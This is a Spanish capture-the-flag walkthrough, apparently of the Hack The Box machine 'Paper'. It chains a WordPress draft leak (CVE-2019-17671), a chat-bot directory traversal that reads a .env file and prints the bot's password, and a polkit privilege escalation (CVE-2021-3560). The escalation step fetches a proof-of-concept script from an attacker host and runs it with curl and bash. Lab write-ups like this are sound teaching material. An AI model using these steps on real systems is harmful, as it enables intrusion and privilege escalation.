// 01

Resumen

Resumen. El 80 sirve la página por defecto de CentOS (403), pero una cabecera no estándar delata un host virtual: X-Backend-Server: office.paper. Ese dominio es un blog WordPress 5.2.3 con CVE-2019-17671: /?static=1 muestra los borradores, y en uno está la URL secreta de registro del chat (chat.office.paper). Dentro de Rocket.Chat, el bot recyclops (un hubot de Dwight) permite listar y leer ficheros con un *directory traversal*: leyendo ../hubot/.env sale la contraseña del bot, que es también la del sistema (dwight). Por SSH se llega a la user flag; para root se explota CVE-2021-3560 (polkit): la máquina tiene sudo 1.8.29 ya parcheado y pkexec sin SUID, pero polkit sigue siendo vulnerable.

// NOTA

Versión simplificada (la usada): el único paso con "montaje" es registrarse en Rocket.Chat (la API REST da 400 porque Apache oculta los errores con ProxyErrorOverride; hay que usar el formulario de la SPA). El resto: /?static=1, el bot, ssh y el script de polkit.

// 04

Host virtual y WordPress

SHELL
$ echo "10.129.136.31 office.paper chat.office.paper" | sudo tee -a /etc/hosts
$ curl -s http://office.paper/ | grep -iE 'wordpress|generator'

Lo que se encontró: office.paper sirve un blog WordPress (tema de "The Office", empresa *Blunder Tiffin*) con WordPress 5.2.3. En los comentarios hay pistas del tipo "no pongas secretos en los borradores".

// 05

CVE-2019-17671: leer los borradores

SHELL
$ curl -s "http://office.paper/?static=1" | sed 's/<[^>]*>/ /g' | grep -iE 'chat|register|secret'

Lo que se encontró: el borrador con la URL de registro del chat:

http://chat.office.paper/register/8qozr226AhkCHZdyY

Por qué funciona: con ?static=1 WordPress mezcla borradores y entradas publicadas y no comprueba los permisos de cada una; si la primera es pública, vuelca todas.

// 06

Registro en Rocket.Chat

chat.office.paper es Rocket.Chat 3.16.1 con registro en modo *Secret URL*. La API REST users.register responde 400 (Apache tiene ProxyErrorOverride, que sustituye el JSON de error por su página HTML, así que no se ve el motivo). Hay que usar el formulario de la SPA (que va por SockJS/websocket).

Con navegador (lo más simple para un humano): abrir http://chat.office.paper/register/8qozr226AhkCHZdyY, rellenar Nombre/Email/Contraseña y pulsar *Register a new account*; después elegir el nombre de usuario.

// NOTA

En esta corrida se hizo con Chromium headless + CDP (para automatizarlo): abrir la página, rellenar los input (name, email, pass, confirm-pass) y pulsar el botón. Quedó el usuario pwner con token de sesión. Con ese token, la API REST ya responde bien (los 200 pasan por Apache).

El bot recyclops y el traversal

En el canal #general se ve que Dwight programó un bot. Por DM:

SHELL
$ python3 bot.py 'recyclops help'
# 3. Files: 'recyclops file test.txt'
# 4. List: 'recyclops list sale'
SHELL
$ python3 bot.py 'recyclops file ../hubot/.env'

Lo que se encontró:

export ROCKETCHAT_URL='http://127.0.0.1:48320'
export ROCKETCHAT_USER=recyclops
export ROCKETCHAT_PASSWORD=Queenofblad3s!23

Por qué funciona: el bot concatena la ruta al directorio sales/ sin normalizarla, así que ../ sale de él. Y la contraseña del bot es la misma del usuario del sistema.

// 09

Root con CVE-2021-3560

Comprobaciones previas (descartan las otras dos CVEs de 2021):

SHELL
$ sudo -V | head -1 # 1.8.29
$ sudoedit -s / # "usage: sudoedit" -> NO vulnerable a Baron Samedit
$ ls -l /usr/bin/pkexec # sin SUID -> PwnKit no sirve

Así que queda polkit (CVE-2021-3560), un ataque de *timing*: se mata la petición D-Bus en el momento justo y polkit concede la acción sin autenticar.

SHELL
# Kali: bajar el PoC de secnigma (autor de la máquina) y servirlo
$ curl -sL -o poc.sh https://raw.githubusercontent.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation/main/poc.sh
$ python3 -m http.server 8000 --bind 10.10.16.12 &
 
# en Paper, como dwight
$ cd /dev/shm && curl -s -O http://10.10.16.12:8000/poc.sh && bash poc.sh

Lo que se encontró: crea el usuario secnigma:secnigmaftw en el grupo wheel:

SHELL
$ sshpass -p secnigmaftw ssh secnigma@10.129.136.31
# uid=1005(secnigma) groups=...,10(wheel)
$ echo secnigmaftw | sudo -S cat /root/root.txt

Root flag: [flag oculta]

Trampa: el exploit es de *timing* y no siempre acierta. Hay que repetirlo; además puede crear el usuario y fallar al meter la contraseña → volver a ejecutarlo hasta que el hash entre.
